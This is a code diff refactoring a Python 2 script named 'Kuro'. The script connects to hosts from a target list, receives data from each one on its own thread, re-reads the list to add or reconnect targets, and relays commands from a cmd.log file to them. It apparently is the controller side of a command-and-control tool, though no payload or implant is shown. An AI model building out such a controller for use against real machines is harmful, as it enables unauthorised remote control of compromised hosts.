@@ -1,5 +1,3 @@
-#!/usr/bin/python
-
 # Kuro looms up ahead, won't allow us to pass.
 # Let us not travel further, lest we unleash her wrath.
 # Her screech can be heard from atop her perch,
@@ -32,26 +30,32 @@ def logActivity(msg):
 	with open(activity_log, "a") as log:
 		log.write(msg + "\n")
 		
+def connectTarget(ip, port):
+	target = Target(ip, int(port))
+	target.secureConnect()
+	if target.isConnected():
+		return target
+	else:
+		return False
+		
 # A list for target objects and threads on which to receive data
 targets = []
 threads = []
 killThreads = False
-		
-# Function that runs recvs on targets in a separate thread
-def recvThread(targetList):
+
+def recvOnTarget(t):
 	global killThreads
 	while True:
 		if killThreads == True:
 			break
 			
-		socket_list = list(s.socket for s in targetList)
-		read_sockets, write, error = select.select(socket_list, [], [])
-		for sock in read_sockets:
-			for t in targetList:
-				if t.socket == sock:
-					if t.isConnected():
-						t.recv()
-						
+		try:
+			ready = select.select([t.socket], [], [], 5)
+			if ready[0]:
+				t.recv()
+		except:
+			break
+
 # Function to disconnect all targets and quit
 def cleanUp(targets):
 	# Close all sockets
@@ -77,26 +81,58 @@ with open(target_list, "r") as targetFile:
 			port = t.split(":")[1]
 		
 			# Connect to the target and append the socket to our list
-			target = Target(ip, int(port))
-			target.secureConnect()
-			if target.isConnected():
-				targets.append(target)
+			newTarget = connectTarget(ip, port)
+			if newTarget != False:
+				newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
+				threads.append(newThread)
+				newThread.start()
+				targets.append(newTarget)
 
 		except KeyboardInterrupt:
 			print "Interrupt detected.  Moving to next target..."
 			continue;
-
-# Continuously loop through all targets polling them for data
-# Send data to one or all targets if data to send is available
-newThread = threading.Thread(target=recvThread, args=(targets,))
-threads.append(newThread)
-newThread.start()
 
 quitFlag = False
 if len(targets) > 0:
 	try:
 		logActivity("[!] Kuro is ready")
 		while True:
+			
+			# Read from the target list to see if any new targets are
+			# available.  If so, attempt to connect to them.
+			with open(target_list, "r") as targetFile:
+				for line in targetFile:
+					skip = False
+					line = line.strip("\n")
+					ip = line.split(":")[0]
+					port = line.split(":")[1]
+					
+					# If the address is found in the target list, check if
+					# the port is the same
+					if any(t.addr == ip for t in targets):
+						for t in targets:
+							# If the ip address matches but the port does not
+							# disconnect the target and remove it from the list
+							if t.addr == ip and t.port != int(port):
+								t.disconnect()
+								targets.remove(t)
+								
+								# Recreate the target object, connect to it, and
+								# add it back to the list
+								newTarget = connectTarget(ip, port)
+								if newTarget != False:
+									newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
+									threads.append(newThread)
+									newThread.start()
+									targets.append(newTarget)
+					else:
+						newTarget = connectTarget(ip, port)
+						if newTarget != False:
+							newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
+							threads.append(newThread)
+							newThread.start()
+							targets.append(newTarget)
+			
 			# Read from cmd.log, send to targets listed, and clear
 			# the file for next use.
 			with open(cmd_list, "r") as cmdFile:
